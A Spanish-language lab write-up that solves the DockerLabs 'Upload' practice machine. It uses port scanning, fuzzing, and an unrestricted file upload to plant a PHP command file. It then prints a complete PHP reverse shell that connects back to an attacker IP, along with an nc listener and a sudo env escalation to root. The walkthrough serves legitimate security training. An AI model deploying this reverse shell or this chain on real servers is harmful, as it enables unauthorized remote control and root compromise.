---
title: "dockerlab.es: máquina UPLOAD"
published: true
date: 2024-04-14 18:37:00
tags: [docker, Web fuzzing, Ethical Hacking, Cybersecurity, binarios unix,Arbitrary File Upload, reverse shell, owasp]
image: /blog/assets/dockerlab.es_upload/portada.png
---

<br>
![](/blog/assets/dockerlab.es_upload/portada.png)
<br>

<br>
### Descripción
* * *
<br>

<br>

### Enlace de Lab:
[Dockerlabs: Upload](https://www.dockerlabs.es/)

### Dificultad:
FÁCIL

### Solución
* * *
<br>

Antes de iniciar este laboratorio, es importante destacar que se trata de máquinas docker que se despliegan localmente en entornos Linux, facilitando así el despliegue de estos laboratorios en máquinas con pocos recursos o virtualizadas.

Al descargar el laboratorio, lo primero que encontramos son dos archivos.

<br>
![](/blog/assets/dockerlab.es_upload/paso_1.png)
<br>

`auto_deploy.sh`: este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos _ctrl+c_, pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.

`upload.tar`: contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.

Para desplegar el laboratorio, lo primero que debemos hacer es:
```bash
bash auto_deploy.sh upload.tar
```
<br>
![](/blog/assets/dockerlab.es_upload/paso_2.png)
<br>

Una vez desplegada nuestra máquina vulnerable, lo primero que debemos identificar es qué puertos tiene disponibles.

```bash
nmap -p- -Pn  -sS --min-rate 5000 --open 172.17.0.2  -oX report.xml -v
```
donde:

`-p-`: Escanea todos los puertos existentes (0-65365)
`-Pn`: Evita que `nmap` realice un descubrimiento de host antes de realizar el escaneo
`-sS`: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK
`--min-rate`: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que `nmap` enviará paquetes a una tasa muy alta
`--open`: Esta opción le indica a `nmap` que sólo muestre los puertos que están abiertos.
`-oX`: Guarda la salida del escaneo en un archivo XML llamado `report.xml`
`-v`: Aumenta la verbosidad de la salida de `nmap`, proporcionando más detalles sobre lo que está haciendo `nmap`.
<br>
![](/blog/assets/dockerlab.es_upload/paso_3.png)
<br>

Nos damos cuenta de que el `puerto 80` es el único disponible, en otras palabras, nuestro punto de acceso a la máquina vulnerable será por el puerto 80, el cual (en la mayoría de casos) pertenece a un servicio web.

Para identificar versiones, tipo de web, tecnología usada y detalles que nos pueden dar pistas en esta fase de reconocimiento, ejecutamos el siguiente código:

```bash
whatweb http://172.17.0.2
```
<br>
![](/blog/assets/dockerlab.es_upload/paso_4.png)
<br>

Nos fijamos en unas palabras bastante peculiares e interesantes:

`Upload here your file`

Lo cual nos da pistas para entender que estamos frente a una vulnerabilidad de `Arbitrary File Upload`[^1] posiblemente.

Accedemos a la web y nos encontramos con la siguiente interfaz, sencilla pero suficiente para provocar la vulnerabilidad que ya sospechábamos, por el hecho de que se puede subir archivos.

<br>
![](/blog/assets/dockerlab.es_upload/paso_5.png)
<br>

Para ver si podemos ejecutar código con intenciones malignas, creamos un archivo PHP con el siguiente código:

```php
<?php 
system('whoami'); 
?>
```

<br>
![](/blog/assets/dockerlab.es_upload/paso_6.png)
<br>

Nos fijamos que ha sido aceptado correctamente; no necesitamos recurrir a ninguna técnica de `File upload bypass`[^2].

Todo correcto, pero,

***¿Dónde se ha subido este archivo de código con intenciones malignas?***

Ahora nos toca hacer _fuzzing_ [^3].

Para esto, ejecutamos un programa llamado _wfuzz_ [^4] con las siguientes instrucciones:
```bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://172.17.0.2/FUZZ
```

Donde:

`-c`: Este comando es simplemente para proporcionar un poco de color a la salida de datos.

`--hc 404`: Ignora todas las respuestas cuyo estado sea 404 (Not Found).

`-t 200`: Asigna una cantidad de hilos (200) para que ejecuten el recorrido de diccionario en paralelo.

`-w`: Este parámetro es para especificar de qué diccionario de datos tomará las palabras para hacer el fuzzing

 web.

<br>
![](/blog/assets/dockerlab.es_upload/paso_7.png)
<br>

Nos damos cuenta de que hay un directorio llamado `uploads`.

Si accedemos a ese directorio, veremos que hay un archivo llamado `whoami.php` que corresponde con el que subimos anteriormente.

<br>
![](/blog/assets/dockerlab.es_upload/paso_8.png)
<br>

Si lo abrimos, veremos `www-data`, lo cual nos confirma que estamos ejecutando código en la máquina víctima.

<br>
![](/blog/assets/dockerlab.es_upload/paso_9.png)
<br>

Ahora es momento de crear una `reverse shell` para poder ingresar al servidor y poder escalar privilegios.

Para ello, hay una infinidad de reverse shells en PHP en la red, en mi caso usaré la siguiente:

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.18.0.1';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Y la subimos mediante el formulario y tendríamos lo siguiente en el directorio `uploads`.

<br>
![](/blog/assets/dockerlab.es_upload/paso_10.png)
<br>

Antes de presionar, debemos correr en una terminal la siguiente sentencia:
```bash
nc -lvnp 443
```
Ahora hacemos click sobre el archivo `reverse_shell.php`.

Y en nuestra terminal que corría `nc` debería aparecer lo siguiente:

<br>
![](/blog/assets/dockerlab.es_upload/paso_11.png)
<br>

Ahora es momento de tratar la bash, más que nada para poder hacer `ctrl+c` sin matar la `reverse_shell` y `ctrl+l` para poder limpiar la pantalla:

```bash
script /dev/null -c bash
```

`ctrl+z`

```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Si hacemos nano, vi o cat, la pantalla nos aparecerá pequeña y no podremos crear archivos con total libertad. Para ello, corremos lo siguiente:

Abrimos una terminal nueva y corremos:

```bash
stty size
```
<br>
![](/blog/assets/dockerlab.es_upload/bash.png)
<br>
Nos aparecerán dos números, el primero corresponde a las `rows` y el segundo a `columns`.

Abrimos la `reverse shell` y corremos el siguiente código:
```bash
stty rows 24 columns 128
```

Ya que tenemos una bash totalmente funcional e interactiva, vamos a empezar a examinar las rutas de escalada de privilegios.

En este caso, con correr el comando `sudo -l` nos aparece lo siguiente:

<br>
![](/blog/assets/dockerlab.es_upload/paso_12.png)
<br>

Es decir, podemos ejecutar el binario `/usr/bin/env` como root sin necesidad de proporcionar contraseña.

Esto es una muy buena noticia para nosotros como atacantes, porque si nos dirigimos a `GTFOBins`[^5] vemos que con el siguiente código podemos acceder a root:

```bash
sudo /usr/bin/env /bin/sh
```

Lo ejecutamos y:

<br>
![](/blog/assets/dockerlab.es_upload/paso_13.png)
<br>

¡Perfecto! Ya somos `root`.

Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`, y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.

<br>
![](/blog/assets/dockerlab.es_upload/paso_14.png)
<br>

Y eso sería todo.

<br>
### _Referencias_
* * *
[^1]: [Arbitrary File Upload Vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
[^2]: [File upload bypass](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)
[^3]: [Fuzzing](https://www.sysadminok.es/blog/ciberseguridad/que-es-y-para-que-sirve-el-fuzzing-un-enfoque-integral-a-la-seguridad-de-software/)
[^4]: [Wfuzz Github](https://wfuzz.readthedocs.io/en/latest/)
[^5]: [GTFOBins docu](https://gtfobins.github.io)